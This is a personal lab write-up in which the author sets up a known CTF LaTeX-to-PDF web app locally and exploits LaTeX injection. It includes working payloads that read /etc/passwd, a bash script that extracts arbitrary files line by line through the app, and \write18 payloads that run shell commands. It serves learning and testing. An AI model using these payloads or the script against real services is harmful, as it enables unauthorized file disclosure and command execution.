# Definition
Something to do.
# Installing and Preparing Lab
I will use my machine to deploy our own website to generate **PDF** documents from **LaTex**.
First, we havo to install a few *packages* needed to use our website.
```shell
sudo apt install texlive-full zathura latexmk rubber -y
```
___
Then, we could configure our *LaTex* environment for later, *this is not necessary*.
```shell
xdg-mime query default application/pdf
xdg-mime default zathura.desktop application/pdf
sudo apt install poppler-utils
```
___
So, let's continue. We are going to use a GitHub project with the server code from [web90](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code).
```shell
cd /var/www/html
sudo service apache2 start
sudo svn checkout https://github.com/internetwache/Internetwache-CTF-2016/trunk/tasks/web90/code
sudo mv code/* .
sudo rm -rf code
sudo mv config.php.sample config.php
```
___
We must assign the right permissions to our *server code*.
```shell
sudo chown www-data:www-data -R *
```
___
Good!, we should see something like this.
![[Pasted image 20230821163251.png]]
___
# Attacking
## Contexualizing
First, let's start by inserting any text in the **Latex** field.
![[Pasted image 20230821163541.png]]
___
To see the generated PDF, we should follow that link.
![[Pasted image 20230821163640.png]]
We can notice that depending on the content that we enter in the **Latex** field we can generate a PDF.
___
## Injections
Why don't we do a web search, if there is a way to hack this behavior?
Then, you could use this payload -> `\input{/etc/passwd}` retrieved from [PayloadAllTheThings-LatexInjection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection).
Let's try out.
You may notice that this *payload* is **BLACKLISTED**.
![[Pasted image 20230821164430.png]]
This because, in the source code that *input* word is *blacklisted* and you can verify it by seeing the content of the file *ajax.php*.
![[Pasted image 20230821164834.png]]
Also, you can note that the code of *ajax.php* file contains an interesting term called **--shell-scape**. So, what does that mean?
![[Pasted image 20230821165235.png]]
___
Doing a investigation about that term, we were able to find a vulnerability from [HackTricks-LatexInjection](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection).
![[Pasted image 20230821165900.png]]
Whit that term, we can execute **ANY** shell command.
___
Good, with the information retrieved so far, back to the [PayloadsAllTheThing](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection) page there is a way to read a single line from a specific file.
```latex
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```
___
Let's use that *payload* to see the **first** line of the **/etc/passwd** file.
![[Pasted image 20230821170746.png]]
You can observe that we were able to see the first line of the **/etc/passwd** file.
___
Now, what if we wanted to see the second line?
We should repeat the **third** line of our *payload*, like this.
```latex
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\read\file to\line
\text{\line}
\closein\file
```
___
Let's use it.
![[Pasted image 20230821171258.png]]
So, we were able to see the **second** line of the **/etc/passwd** file.
___
Finally, what if we wanted to see several lines?
We should name **every** line we want to see, like this.
```latex
\newread\file
\openin\file=/etc/passwd
\read\file to\lineA
\read\file to\lineB
\read\file to\lineC
\read\file to\lineD
\read\file to\lineE
\text{\lineA\lineB\lineC\lineD\lineE}
\closein\file
```
___
Let's use it.
![[Pasted image 20230821172144.png]]
We were able to see several lines of the **/etc/passwd**, but all of them in the same line.
___
Another *payload* from [HackTricks-LatexInjection](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection) uses a **loop** to iterate and print *every* line from **/etc/passwd** file.
```latex
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```
___
Let's try it.
![[Pasted image 20230821172935.png]]
This execution ended in a **ERROR**. Because *latex* conflicts with **some** character. It could be the `_` character used in the **/etc/passwd** file.
___
### Bash Scripting
We have seen the content of *every* line from **/etc/passwd**. So, why don't we code a *bash* script to obtain the entire content of the **/etc/passwd** file or any other file?
Let's code it.
*getFileContent.sh*, this script uses a *payload* to see, from the **PDF** generated, a single line from a specific **file** using a bucle to jump to the next line (`\read\file to\line`) and avoiding *errors*.
```bash
#!/bin/bash

# global variables
declare -r main_url="http://localhost/ajax.php"
filename=$1
n_lines=$2

# if the filename and the number of lines are being sent
if [ $filename ] && [ $n_lines ]; then
	jump_line_string="%0A\read\file%20to\line"
	for i in $(seq 1 $n_lines); do
		# get url generated of the latex code
		url_file_generated=$(curl -s -X POST $main_url -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "content=\newread\file%0A\openin\file=$filename$jump_line_string%0A\text{\line}%0A\closein\file&template=blank" | grep -i "download" | awk 'NF{print $NF}')

		if [ $url_file_generated ]; then
			# get the PDF generated and its name
			wget $url_file_generated &>/dev/null
			pdf_name=$(echo $url_file_generated | tr '/' ' ' | awk 'NF{print $NF}')

			# convert PDF generated to TXT
			pdftotext $pdf_name

			# print the desired content
			txt_name=$(echo $pdf_name | sed 's/\.pdf/\.txt/')
			cat $txt_name | head -n 1

			# clean the environment
			rm -f $pdf_name
			rm -f $txt_name
		fi 

		# jump to the next line
		jump_line_string+="%0A\read\file%20to\line"
	done
else
	echo -e "\n[!] Use: $0 /etc/passwd 60\n"
fi
```
___
```shell
./getFileContent.sh /etc/passwd 60
```
![[Pasted image 20230821184735.png]]
___
## Command Execution
If we see more in deep the [PayloadAllTheThings-LatexCE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection) webpage, we can observe we can execute commands.
The payload, in **LaTex**, is.
```latex
\immediate\write18{id}
```
![[Pasted image 20230821185658.png]]
The *output* of the given command is being shown in the **compiling error**.
___
What if we wanted to see the *output* of a given command within a generated PDF?
Well, we could achieve that by combining the *reading* of a single line with this *payload*.
The output of the command `id` is saved in the **output** file, then the content of the **output** file is read with another *payload* already seen.
```latex
\immediate\write18{id > output}
\newread\file
\openin\file=output
\read\file to\line
\text{\line}
\closein\file
```
![[Pasted image 20230821190621.png]]
___
## Another Attack
When we generate the **output** file in the previous *injection*, that file is stored in the **compile** directory.
![[Pasted image 20230821191003.png]]
![[Pasted image 20230821191120.png]]
___
Well, if we want to see the content of the **/etc/passwd** file as before, we should use the following payload and then see it in the web.
```latex
\immediate\write18{cat /etc/passwd > output.txt}
```
![[Pasted image 20230821191419.png]]
___